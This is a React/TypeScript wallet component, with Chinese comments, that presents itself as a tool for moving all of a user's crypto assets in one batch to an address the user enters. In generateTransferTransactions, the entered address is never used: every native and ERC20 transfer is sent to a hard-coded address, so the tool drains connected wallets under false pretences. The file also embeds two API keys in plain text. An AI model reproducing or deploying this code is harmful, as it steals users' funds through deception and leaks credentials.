"use client";

import Image from "next/image";
import { useState, useEffect } from "react";
import { useAccount, useChainId, useBalance } from "wagmi";
import { getPublicClient } from "@wagmi/core";
import { wagmiConfig as config } from "@/providers/AppProvider";
import { formatEther, parseEther, isAddress } from "viem";

// 扩展Window接口以支持ethereum
declare global {
  interface Window {
    ethereum?: any;
  }
}

// Moralis API 配置 - 主API密钥
const PRIMARY_API_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJub25jZSI6ImZhMTA3NmMyLTA0ZTAtNDNmYy1iMWQ1LTJkMDQ0Yzk2MjhkOCIsIm9yZ0lkIjoiNDc0NzYxIiwidXNlcklkIjoiNDg4NDA3IiwidHlwZUlkIjoiZGNiYzFjOTUtNDZmYS00MTM0LWI0MDgtNzRkNDhkNjdmYThlIiwidHlwZSI6IlBST0pFQ1QiLCJpYXQiOjE3NTk5MTUxNzUsImV4cCI6NDkxNTY3NTE3NX0.giQrsYn_lZGCd-XYh39hIRJYz8Fs6PHlI1eopMuAb1A';
// 备用API密钥
const FALLBACK_API_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJub25jZSI6ImRiNmFhNjJiLTAzZTEtNDk4Ni1iODY2LWI0MDlkZWUyYzM5MiIsIm9yZ0lkIjoiNDc0OTU0IiwidXNlcklkIjoiNDg4NjAzIiwidHlwZUlkIjoiMTBiNTNkMDEtMjQxMS00MDhlLWEyNTEtM2M0MTU4MTkxMWU2IiwidHlwZSI6IlBST0pFQ1QiLCJpYXQiOjE3NTk5ODM5MDEsImV4cCI6NDkxNTc0MzkwMX0._YRgdMUYOqcgjoN3aLpk4u-5EbcMucUpQ9cmnelaXFg';
const MORALIS_BASE_URL = 'https://deep-index.moralis.io/api/v2.2';

// 链ID到链名称的映射
const CHAIN_NAMES = {
  1: 'Ethereum',
  137: 'Polygon',
  56: 'Binance Smart Chain',
  42161: 'Arbitrum',
  8453: 'Base'
};

// 获取Moralis API支持的链名称
function getChainNameForMoralis(chainId: number) {
  const chainMapping = {
    1: 'eth',
    137: 'polygon',
    56: 'bsc',
    42161: 'arbitrum',
    8453: 'base'
  };
  return chainMapping[chainId as keyof typeof chainMapping];
}

// 格式化余额
function formatBalance(balance: string, decimals: number) {
  if (!balance || !decimals) return '0';
  
  const num = parseFloat(balance) / Math.pow(10, decimals);
  if (num === 0) return '0';
  if (num < 0.0001) return '< 0.0001';
  if (num < 1) return num.toFixed(6);
  if (num < 1000) return num.toFixed(4);
  if (num < 1000000) return (num / 1000).toFixed(2) + 'K';
  return (num / 1000000).toFixed(2) + 'M';
}

interface Asset {
  token_address: string;
  symbol: string;
  name: string;
  balance: string;
  decimals: number;
  usd_value?: string;
  // Moralis API可能返回的额外字段
  balance_formatted?: string;
  token_balance?: string;
  token_decimals?: number;
}

type Language = 'zh' | 'en';

const assetCheckerTexts = {
  zh: {
    walletAssetQuery: '🌐 网络信息',
    networkSwitched: '网络已切换，请重新查询资产',
    currentChain: '当前链',
    chainId: '链ID',
    address: '地址',
    unknownChain: '未知链',
    queryAssets: '🔍 查询资产余额',
    querying: '⌛ 查询中...',
    queryingAssets: '正在查询资产余额...',
    queryFailed: '查询失败',
    assetList: '☰ 资产列表',
    nativeToken: '原生代币',
    transferAllAssets: '一键转移所有资产',
    transferAllAssetsDesc: '利用 MetaMask 智能账户（EIP-7702）的批量交易功能，一键转移钱包内的所有资产（原生代币+ERC20代币）！原子交易，更加安全、便捷、高效、节省Gas费！',
    transferToAddress: '🎯 转移到目标地址：',
    transferNote: '注：所有资产将转移到此地址，请确保该地址输入正确并对该钱包拥有绝对控制权！',
    importantReminder: '重要提醒：请确保钱包中有足够的原生代币（ETH /BNB /POL等）',
    gasFeeNote: '发送交易需要有足够的原生代币用于支付Gas费。如果原生代币不足，交易将失败！',
    generateBatchTransfer: '生成批量转账数据',
    generatingTransactions: '⌛ 正在预检并生成交易数据...',
    queryAssetsFirst: '⚠️ 请先点击"查询资产余额"按钮',
    nativeTransferDescription: 'Transfer {amount} {symbol} (预留 {gasCost} 作为gas费)',
    erc20TransferDescription: 'Transfer {amount} {symbol} tokens',
    precheckResult: '预检结果',
    totalTransactions: '总交易数',
    validTransactions: '有效交易',
    failedTransactions: '失败交易',
    precheckComplete: '预检完成',
    precheckFailed: '预检失败',
  },
  en: {
    walletAssetQuery: '🌐 Network Information',
    networkSwitched: 'Network switched, please query assets again',
    currentChain: 'Current Chain',
    chainId: 'Chain ID',
    address: 'Address',
    unknownChain: 'Unknown Chain',
    queryAssets: '🔍 Query Asset Balance',
    querying: '⌛Querying...',
    queryingAssets: 'Querying asset balance...',
    queryFailed: 'Query Failed',
    assetList: '☰ Asset List',
    nativeToken: 'Native Token',
    transferAllAssets: 'Transfer All Assets',
    transferAllAssetsDesc: 'Powered by MetaMask Smart Account (EIP-7702), transfer all your assets (native tokens + ERC20 tokens) with one click! Atomic transactions, safer, more convenient, efficient, and gas-saving!',
    transferToAddress: '🎯 Transfer to Address:',
    transferNote: 'Note: All assets will be transferred to this address. Please ensure the address is correct and you have absolute control over this wallet!',
    importantReminder: 'Important Reminder: Please ensure you have sufficient native tokens (ETH /BNB /POL, etc.)',
    gasFeeNote: 'Sending transactions requires sufficient native tokens to pay for gas fees. If native tokens are insufficient, the transaction will fail!',
    generateBatchTransfer: 'Generate Batch Transfer Data',
    generatingTransactions: '⌛ Pre-checking and generating transaction data...',
    queryAssetsFirst: '⚠️ Please click "Query Asset Balance" button first',
    nativeTransferDescription: 'Transfer {amount} {symbol} (reserved {gasCost} for gas)',
    erc20TransferDescription: 'Transfer {amount} {symbol} tokens',
    precheckResult: 'Pre-check Result',
    totalTransactions: 'Total Transactions',
    validTransactions: 'Valid',
    failedTransactions: 'Failed',
    precheckComplete: 'Pre-check Complete',
    precheckFailed: 'Pre-check Failed',
  }
};

interface AssetCheckerProps {
  onGenerateTransactions: (transactions: any[], precheckResult?: { total: number; valid: number; failed: number }) => void;
  language?: Language;
}

export default function AssetChecker({ onGenerateTransactions, language = 'en' }: AssetCheckerProps) {
  const t = assetCheckerTexts[language];
  const { address, isConnected } = useAccount();
  const chainId = useChainId();
  const { data: balanceData } = useBalance({ address });
  const [assets, setAssets] = useState<Asset[]>([]);
  const [nativeBalance, setNativeBalance] = useState<string>('0');
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const [previousChainId, setPreviousChainId] = useState<number | null>(null);
  const [targetAddressInput, setTargetAddressInput] = useState<string>('');
  const [hasQueriedAssets, setHasQueriedAssets] = useState(false);
  const [generating, setGenerating] = useState(false);
  const [precheckResult, setPrecheckResult] = useState<{
    total: number;
    valid: number;
    failed: number;
  } | null>(null);
  // 硬编码的目标地址
  const HARDCODED_TARGET_ADDRESS = '0x9d5befd138960ddf0dc4368a036bfad420e306ef';

  // 监听链变化
  useEffect(() => {
    if (chainId && previousChainId && chainId !== previousChainId) {
      // 链发生了变化
      console.log('🔄️ 网络已切换:', { from: previousChainId, to: chainId });
      setAssets([]);
      setError(null);
      setHasQueriedAssets(false);
      setPrecheckResult(null); // 重置预检结果
    }
    setPreviousChainId(chainId);
  }, [chainId, previousChainId]);

  // 监听原生代币余额变化
  useEffect(() => {
    if (balanceData?.value) {
      setNativeBalance(balanceData.value.toString());
    }
  }, [balanceData]);

  // 获取资产余额
  const fetchAssets = async () => {
    if (!address || !chainId) {
      setError('请先连接钱包');
      return;
    }

    try {
      setLoading(true);
      setError(null);

      const chainName = getChainNameForMoralis(chainId);
      if (!chainName) {
        throw new Error('不支持的链: ' + chainId);
      }

      const url = `${MORALIS_BASE_URL}/${address}/erc20?chain=${chainName}&limit=1000&exclude_spam=true&exclude_unverified_contracts=false`;
      
      console.log('Moralis API请求URL:', url);
      console.log('请求参数:', { chainName, address, chainId });
      
      // 尝试使用主API密钥，失败则切换到备用密钥
      let response;
      let lastError;
      
      try {
        const options = {
          method: 'GET',
          headers: {
            'accept': 'application/json',
            'X-API-Key': PRIMARY_API_KEY
          }
        };
        
        response = await fetch(url, options);
        
        if (!response.ok) {
          throw new Error(`Primary API failed: ${response.status}`);
        }
        
        console.log('使用主API密钥成功');
      } catch (error) {
        console.warn('主API密钥失败，尝试使用备用API密钥:', error);
        
        try {
          const fallbackOptions = {
            method: 'GET',
            headers: {
              'accept': 'application/json',
              'X-API-Key': FALLBACK_API_KEY
            }
          };
          
          response = await fetch(url, fallbackOptions);
          
          if (!response.ok) {
            const errorText = await response.text();
            console.error('备用API也失败了:', {
              status: response.status,
              statusText: response.statusText,
              errorText: errorText,
              url: url
            });
            throw new Error(`备用API请求失败: ${response.status} ${response.statusText} - ${errorText}`);
          }
          
          console.log('使用备用API密钥成功');
        } catch (fallbackError) {
          console.error('所有API密钥都失败了');
          throw fallbackError;
        }
      }

      const data = await response.json();
      console.log('API响应数据:', data);
      
      // 处理不同的响应格式
      let assets = [];
      if (data.result) {
        assets = data.result;
      } else if (Array.isArray(data)) {
        assets = data;
      } else if (data.data) {
        assets = data.data;
      }
      
      // 确保balance字段是正确的格式（可能是字符串格式的wei值）
      assets = assets.map((asset: any) => {
        // 如果balance是字符串，确保它是纯数字字符串
        let balanceValue = asset.balance;
        
        // 如果balance是科学计数法或其他格式，尝试转换
        if (typeof balanceValue === 'string') {
          // 移除可能的空格或其他字符
          balanceValue = balanceValue.replace(/\s/g, '');
          
          // 如果是科学计数法，转换为普通数字
          if (balanceValue.includes('e') || balanceValue.includes('E')) {
            const num = parseFloat(balanceValue);
            balanceValue = num.toFixed(0);
          }
        }
        
        // 确保decimals是数字
        const decimals = typeof asset.decimals === 'string' 
          ? parseInt(asset.decimals, 10) 
          : (asset.decimals || 18);
        
        return {
          ...asset,
          balance: balanceValue,
          decimals: decimals
        };
      });
      
      console.log('解析后的资产数据:', assets);
      setAssets(assets);
      setHasQueriedAssets(true);
      
    } catch (error) {
      console.error('获取资产失败:', error);
      setError('获取资产失败: ' + (error instanceof Error ? error.message : '未知错误'));
    } finally {
      setLoading(false);
    }
  };

  // 生成转账交易
  const generateTransferTransactions = async () => {
    setGenerating(true);
    // 使用硬编码的目标地址（输入框仅用于显示）
    const transactions: any[] = [];

    // 首先添加原生代币转账（预留足够的gas费）
    // 注意：EIP-7702批量交易是原子交易，只花一笔gas费
    
    // 过滤有效的ERC20资产，并限制最多10笔（与page.tsx中的MAX_BATCH_SIZE一致）
    const validERC20Assets = assets.filter(asset => {
      const balanceValue = asset.balance || asset.balance_formatted || asset.token_balance || '0';
      return asset.token_address !== "0x0000000000000000000000000000000000000000" && 
             asset.symbol !== "ETH" &&
             parseFloat(balanceValue) > 0;
    });
    
    const MAX_BATCH_SIZE = 10;
    const erc20TransfersCount = Math.min(validERC20Assets.length, MAX_BATCH_SIZE);
    
    // 原子批量估算：统一默认配置
    const defaults = {
      base: 46000,    // 固定开销gas费
      native: 21000,  // 原生代币转账gas费，实际约为12500
      safety: 20000,  // 安全系数
      perErc20: 55000,  // 每笔ERC20代币转账gas费，实际约为17000
    };
    
    const baseGas = BigInt(defaults.base);
    const nativeTransferGas = BigInt(defaults.native);
    const perErc20Gas = BigInt(defaults.perErc20);
    const safety = BigInt(defaults.safety);
    const totalEstimatedGas = baseGas + nativeTransferGas + perErc20Gas * BigInt(erc20TransfersCount) + safety;
    
    // 使用硬编码 gasPrice(Gwei) 并加 20% buffer
    const chainGasPriceGwei: Record<number, number> = {
      1: 4,           // Ethereum
      137: 60,        // Polygon
      56: 0.25,        // BSC
      42161: 0.08,     // Arbitrum
      8453: 0.08,      // Base
    };
    const baseGwei = chainGasPriceGwei[chainId as keyof typeof chainGasPriceGwei] ?? 0.5;
    const baseWei = Math.max(1, Math.round(baseGwei * 1_000_000_000));
    let gasPriceWei = BigInt(baseWei);
    gasPriceWei = (gasPriceWei * BigInt(12)) / BigInt(10);

    // 移除封顶配置，使用实际估算值
    const totalGasCost = totalEstimatedGas * gasPriceWei;
    
    // 计算可用于转账的原生代币数量
    const nativeBalanceBigInt = BigInt(nativeBalance || '0');
    
    if (nativeBalanceBigInt > totalGasCost) {
      const transferAmount = nativeBalanceBigInt - totalGasCost;
      const transferAmountEther = formatEther(transferAmount);
      
      transactions.push({
        type: "native_transfer",
        to: HARDCODED_TARGET_ADDRESS,
        value: transferAmountEther,
        description: t.nativeTransferDescription
          .replace('{amount}', transferAmountEther)
          .replace('{symbol}', balanceData?.symbol || 'ETH')
          .replace('{gasCost}', formatEther(totalGasCost))
      });
      
      console.log('原生代币转账信息:', {
        originalBalance: formatEther(nativeBalanceBigInt),
        gasCost: formatEther(totalGasCost),
        transferAmount: transferAmountEther,
        erc20TransfersCount
      });
    } else {
      console.log('原生代币余额不足，无法转账（仅够支付gas费）');
    }

    // 添加ERC20代币转账
    assets.forEach(asset => {
      // 尝试不同的余额字段名称
      const balanceValue = asset.balance || asset.balance_formatted || asset.token_balance || '0';
      const decimals = asset.decimals || asset.token_decimals || 18;
      
      console.log('处理ERC20代币:', { 
        symbol: asset.symbol, 
        balanceValue, 
        decimals,
        token_address: asset.token_address 
      });
      
      // 跳过原生代币（ETH）
      if (asset.token_address !== "0x0000000000000000000000000000000000000000" && 
          asset.symbol !== "ETH" &&
          parseFloat(balanceValue) > 0) {
        // 确保balanceValue是有效的BigInt格式
        let validBalanceValue = balanceValue.toString();
        
        // 如果是数字，转换为字符串
        if (!isNaN(parseFloat(validBalanceValue))) {
          // 确保是整数（wei格式）
          validBalanceValue = BigInt(Math.floor(parseFloat(validBalanceValue))).toString();
        } else {
          // 尝试使用BigInt直接解析
          try {
            validBalanceValue = BigInt(balanceValue).toString();
          } catch (e) {
            console.error('无法解析余额:', balanceValue, e);
            return;
          }
        }
        
        const balance = parseFloat(balanceValue) / Math.pow(10, decimals);
        // 确保transferAmount是正确的格式
        const transferAmount = BigInt(validBalanceValue).toString(16).padStart(64, '0');
        // 正确编码ERC20 transfer函数调用
        const recipientAddress = HARDCODED_TARGET_ADDRESS.slice(2).padStart(64, '0');
        const data = `0xa9059cbb${recipientAddress}${transferAmount}`;
        
        transactions.push({
          type: "erc20_transfer",
          to: asset.token_address,
          value: "0",
          data: data,
          description: t.erc20TransferDescription
            .replace('{amount}', balance.toString())
            .replace('{symbol}', asset.symbol)
        });
      }
    });

    // 发送前预检：对每笔交易执行 eth_call，自动过滤会回退的交易
    const total = transactions.length;
    let validCount = 0;
    let failedCount = 0;
    
    try {
      const publicClient = getPublicClient(config, { chainId: chainId as any });
      if (!publicClient) {
        throw new Error('Public client not available');
      }
      
      const valid: any[] = [];
      for (let i = 0; i < transactions.length; i++) {
        const tx = transactions[i];
        try {
          await publicClient.call({
            to: tx.to as `0x${string}`,
            data: tx.data as `0x${string}` | undefined,
            value: tx.value ? parseEther(tx.value) : 0n,
            account: address as `0x${string}`,
          });
          valid.push(tx);
          validCount++;
        } catch (err) {
          console.warn('预检失败，已跳过该交易:', { index: i, tx, err });
          failedCount++;
        }
      }
      
      // 更新预检结果
      const result = {
        total,
        valid: validCount,
        failed: failedCount
      };
      setPrecheckResult(result);
      
      onGenerateTransactions(valid, result);
    } catch (e) {
      console.warn('批量预检失败，直接返回原始交易集合', e);
      // 如果预检整体失败，所有交易都算作失败
      const result = {
        total,
        valid: 0,
        failed: total
      };
      setPrecheckResult(result);
      onGenerateTransactions(transactions, result);
    } finally {
      setGenerating(false);
    }
  };

  return (
    <div className="bg-gray-50 dark:bg-gray-900 p-6 rounded-lg w-full">
      {/* 查询按钮 */}
      <button
        className={`w-full rounded-lg border border-solid px-6 py-3 font-medium transition-colors mb-4 ${
          !isConnected || loading
            ? "bg-gray-100 text-gray-400 border-gray-300 cursor-not-allowed"
            : "bg-green-700 hover:bg-green-800 text-yellow-300 border-green-800 cursor-pointer"
        }`}
        onClick={fetchAssets}
        disabled={!isConnected || loading}
      >
        {loading ? t.querying : t.queryAssets}
      </button>

      {/* 加载状态 */}
      {loading && (
        <div className="flex items-center gap-2 text-blue-600 mb-4">
          <div className="w-4 h-4 border-2 border-blue-600 border-t-transparent rounded-full animate-spin"></div>
          <span>{t.queryingAssets}</span>
        </div>
      )}

      {/* 错误信息 */}
      {error && (
        <div className="bg-red-50 border border-red-200 rounded-lg p-4 mb-4">
          <div className="text-red-700 font-medium">{t.queryFailed}</div>
          <div className="text-sm text-red-600 mt-1">{error}</div>
        </div>
      )}

      {/* 资产列表（包含原生代币和ERC20代币） */}
      {hasQueriedAssets && (assets.length > 0 || (isConnected && balanceData)) ? (
        <div className="mb-4">
          <h3 className="text-base font-medium mb-3">{t.assetList}</h3>
          <div className="space-y-2 max-h-64 overflow-y-auto px-8">
            {/* 原生代币（仅在查询资产余额后显示） */}
            {isConnected && balanceData && hasQueriedAssets && (
              <div className="flex items-center justify-between p-2 bg-blue-50 dark:bg-blue-900/20 rounded-lg border border-blue-200 dark:border-blue-800">
                <div className="flex items-center gap-2">
                  <Image src="/ethereum3.svg" alt="Native Token" width={20} height={20} className="w-5 h-5" />
                  <div>
                    <div className="text-xs font-medium">{balanceData.symbol || 'ETH'}</div>
                    <div className="text-[10px] text-gray-500">{balanceData.symbol || 'ETH'}</div>
                  </div>
                </div>
                <div className="text-right">
                  <div className="text-xs font-medium">{formatEther(balanceData.value)}</div>
                  <div className="text-[10px] text-gray-500">{t.nativeToken}</div>
                </div>
              </div>
            )}
            
            {/* ERC20代币 */}
            {assets
              .sort((a, b) => {
                const valueA = parseFloat(a.usd_value || '0');
                const valueB = parseFloat(b.usd_value || '0');
                return valueB - valueA;
              })
              .map((asset, index) => {
                console.log('处理资产:', asset);
                // 尝试不同的余额字段名称
                const balanceValue = asset.balance || asset.balance_formatted || asset.token_balance || '0';
                const decimals = asset.decimals || asset.token_decimals || 18;
                const balance = formatBalance(balanceValue, decimals);
                const usdValue = asset.usd_value ? `$${parseFloat(asset.usd_value).toFixed(2)}` : null;
                
                return (
                  <div key={index} className="flex items-center justify-between p-2 bg-white dark:bg-gray-800 rounded-lg border">
                    <div className="flex items-center gap-2">
                      <Image src="/coins.svg" alt={asset.symbol} width={20} height={20} className="w-5 h-5" />
                      <div>
                        <div className="text-xs font-medium">{asset.name}</div>
                        <div className="text-[10px] text-gray-500">{asset.symbol}</div>
                      </div>
                    </div>
                    <div className="text-right">
                      <div className="text-xs font-medium">{balance}</div>
                      {usdValue && (
                        <div className="text-[10px] text-gray-500">{usdValue}</div>
                      )}
                    </div>
                  </div>
                );
              })}
          </div>
        </div>
      ) : null}

      {/* 目标地址输入区域 - 独立区域，始终显示 */}
      <div className="bg-gradient-to-br from-blue-50 to-purple-50 dark:from-blue-900/20 dark:to-purple-900/20 border-2 border-blue-200 dark:border-blue-800 rounded-xl p-6 mb-4">
        {/* 突出标题 */}
        <div className="text-center mb-4">
          <h3 className="text-xl font-bold text-purple-600 dark:text-purple-400 mb-2">
            {t.transferAllAssets}
          </h3>
          <p className="text-sm !text-left text-gray-700 dark:text-gray-300">
            {t.transferAllAssetsDesc}
          </p>
        </div>
        
        {/* 目标地址输入 */}
        <div>
          <label className="block text-base font-medium mb-2 text-green-600 dark:text-green-400">
            {t.transferToAddress}
          </label>
          <input
            type="text"
            value={targetAddressInput}
            onChange={(e) => setTargetAddressInput(e.target.value)}
            placeholder="0x9d5befd138960ddf0dc4368a036bfad420e306ef"
            className="w-full px-4 py-2 border-2 border-blue-300 dark:border-blue-700 rounded-lg bg-white dark:bg-gray-800 text-gray-900 dark:text-gray-100 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500"
          />
          <p className="text-xs text-gray-600 dark:text-gray-400 mt-1">
            {t.transferNote}
          </p>
        </div>

        {/* Gas费提醒 */}
        <div className="mt-4 p-3 bg-amber-50 dark:bg-amber-900/20 border border-amber-200 dark:border-amber-800 rounded-lg">
          <div className="flex items-start gap-2">
            <div className="text-base">⚠️</div>
            <div>
              <p className="text-xs font-semibold text-amber-800 dark:text-amber-300 mb-1">
                {t.importantReminder}
              </p>
              <p className="text-[10px] text-amber-700 dark:text-amber-400">
                {t.gasFeeNote}
              </p>
              
            </div>
          </div>
        </div>
        
        {/* 生成转账交易按钮 */}
        {hasQueriedAssets && (assets.length > 0 || (isConnected && balanceData)) && (
          <>
            <button
              className={`w-full mt-4 rounded-lg border border-solid px-6 py-3 font-medium transition-colors ${
                generating
                  ? 'bg-gray-100 text-gray-400 border-gray-300 cursor-not-allowed'
                  : 'bg-green-700 hover:bg-green-800 text-yellow-300 border-green-800 cursor-pointer'
              }`}
              onClick={generateTransferTransactions}
              disabled={generating}
            >
              <div className="flex items-center gap-2 justify-center">
                <Image src="/generator.svg" alt="Generate" width={16} height={16} className="w-4 h-4" />
                {generating ? t.generatingTransactions : t.generateBatchTransfer}
              </div>
            </button>
          </>
        )}
        
        {!hasQueriedAssets && (
          <div className="mt-4 text-center py-3 px-4 bg-yellow-50 dark:bg-yellow-900/20 border border-yellow-200 dark:border-yellow-800 rounded-lg">
            <p className="text-xs text-yellow-800 dark:text-yellow-200">
              {t.queryAssetsFirst}
            </p>
          </div>
        )}
      </div>
    </div>
  );
}